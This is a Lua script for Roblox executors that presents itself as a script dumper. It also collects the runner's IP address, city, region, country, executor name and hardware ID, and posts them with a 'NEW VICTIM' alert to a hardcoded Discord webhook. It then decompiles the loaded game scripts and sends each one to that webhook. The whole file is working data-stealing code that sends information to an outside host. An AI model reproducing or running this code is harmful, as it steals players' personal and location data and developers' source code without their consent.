local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW-ZNTyNPts5rOxvBSQXrqdzBVe1p7k3taITTXAU2nNC8QpIyGxPUiux_R9ndjq"

-- Function to send webhook
local function sendWebhook(content)
    local payload = HttpService:JSONEncode(content)
    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
    pcall(function()
        http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
    wait(1) -- Rate limit protection
end

-- Get IP info
local ipData = {}
pcall(function()
    ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
end)

local ip = ipData.ip or "Unknown"
local city = ipData.city or "Unknown"
local region = ipData.region or "Unknown"
local country = ipData.country_name or "Unknown"

local executor = "Unknown"
pcall(function() executor = identifyexecutor() end)

local hwid = "Unknown"
pcall(function() hwid = gethwid() end)

-- Send initial info message
sendWebhook({
    ["content"] = "@everyone 🎯 NEW VICTIM",
    ["embeds"] = {{
        ["title"] = "📡 Executor Dump Started",
        ["color"] = 15158332,
        ["fields"] = {
            {["name"] = "🌐 IP Address", ["value"] = "`" .. ip .. "`"},
            {["name"] = "🌍 Location", ["value"] = "`" .. city .. ", " .. region .. ", " .. country .. "`"},
            {["name"] = "🔧 Executor", ["value"] = "`" .. executor .. "`"},
            {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`"}
        }
    }}
})

-- Collect all scripts
local scripts = {}

if getscripts then
    pcall(function()
        for _, script in pairs(getscripts()) do
            local source = "-- Unable to decompile"
            pcall(function()
                if decompile then
                    source = decompile(script)
                elseif getsrc then
                    source = getsrc(script)
                end
            end)
            
            table.insert(scripts, {
                name = script.Name or "Unnamed",
                type = script.ClassName,
                source = source
            })
        end
    end)
else
    -- Fallback: scan game manually
    local function scanContainer(container)
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                local source = "-- Protected or unable to decompile"
                pcall(function()
                    if decompile then source = decompile(obj) end
                end)
                
                table.insert(scripts, {
                    name = obj.Name,
                    type = obj.ClassName,
                    source = source
                })
            end
        end
    end
    
    pcall(function() scanContainer(game.Workspace) end)
    pcall(function() scanContainer(game.Players.LocalPlayer) end)
    pcall(function() scanContainer(game.ReplicatedStorage) end)
end

-- Send each script as separate message
if #scripts == 0 then
    sendWebhook({
        ["embeds"] = {{
            ["title"] = "❌ No Scripts Found",
            ["description"] = "Executor doesn't support script enumeration or no scripts loaded",
            ["color"] = 15158332
        }}
    })
else
    for i, scriptData in pairs(scripts) do
        -- Truncate if too long (Discord limit is ~2000 chars per field)
        local source = scriptData.source
        if #source > 1900 then
            source = source:sub(1, 1900) .. "\n\n... (truncated, script too long)"
        end
        
        sendWebhook({
            ["embeds"] = {{
                ["title"] = "📜 Script #" .. i .. " - " .. scriptData.name,
                ["description"] = "```lua\n" .. source .. "\n```",
                ["color"] = 3447003,
                ["fields"] = {
                    {["name"] = "Type", ["value"] = "`" .. scriptData.type .. "`", ["inline"] = true},
                    {["name"] = "Length", ["value"] = "`" .. #scriptData.source .. " characters`", ["inline"] = true}
                }
            }}
        })
    end
    
    -- Send completion message
    sendWebhook({
        ["embeds"] = {{
            ["title"] = "✅ Dump Complete",
            ["description"] = "Successfully dumped **" .. #scripts .. " scripts** from " .. executor,
            ["color"] = 65280
        }}
    })
end
